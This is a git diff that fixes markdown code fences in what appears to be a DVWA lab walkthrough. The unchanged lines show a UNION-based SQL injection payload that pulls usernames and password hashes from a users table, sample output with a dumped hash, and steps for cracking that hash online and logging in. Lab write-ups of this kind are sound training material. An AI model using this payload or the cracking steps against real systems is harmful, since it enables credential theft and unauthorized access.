@@ -335,18 +335,21 @@ chose option ```DVWA Security ``` and set it to ```low ``` and ```submit```
 %' and 1=0 union select null, concat(user,':',password) from users #
 ```
 
-```sample output
+```
+sample output
 
 ID: %' and 1=0 union select null, concat(user,':',password) from users #
 
 First name: 
 
 Surname: gordonb:21232f297a57a5a743894a0e4a801fc3
-```bash
+```
 
+```bash
 Uses crackstation to crack password
 
-```Put in hashed password in https://crackstation.net/ 
+```
+Put in hashed password in https://crackstation.net/ 
 And then use the Surname from the output and  cracked password
 ```
 
